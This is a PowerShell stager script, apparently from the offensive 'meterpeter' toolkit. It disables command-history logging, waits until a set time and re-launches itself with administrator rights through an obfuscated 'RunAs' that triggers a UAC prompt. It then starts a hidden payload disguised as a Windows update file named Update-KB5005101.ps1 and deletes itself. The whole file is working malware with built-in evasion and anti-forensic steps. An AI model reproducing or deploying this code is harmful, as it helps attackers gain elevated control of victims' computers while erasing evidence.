<#
.SYNOPSIS
   UAC Auto-Elevate meterpeter client payload

.NOTES
   Target user will be prompt by UAC to run elevated.
#>


$StartTime='20:20'
## Global variable declarations
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption -HistorySaveStyle SaveNothing|Out-Null


If($StartTime -Match '^(\d+\d+:+\d+\d)$')
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Sleep for xx minutes function.
   #>

   write-host "[*] Schedule start at [" -NoNewline
   write-host "$StartTime" -ForegroundColor Red -NoNewline
   write-host "] hours."

   For(;;)
   {
      ## Compare $CurrentTime with $StartTime
      $CurrentTime = (Get-Date -Format 'HH:mm')
      If($CurrentTime -Match "^($StartTime)$")
      {
         break # Continue execution now
      }

      ## loop each 10 seconds
      Start-Sleep -Seconds 10
   }
}

$UserLand = "%R@u@n%@A@s%" -replace '(@|%)',''
If(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
{
  ## Relaunch as an elevated process
  Start-Process powershell.exe "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb $UserLand
  exit
}

## Execute meterpeter client
write-host "[*] Executing meterpeter client .."
Start-Process -WindowStyle Hidden powershell -ArgumentList "-file '$Env:TMP\Update-KB5005101.ps1'"

## Auto-Delete cmdlet in the end ...
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
exit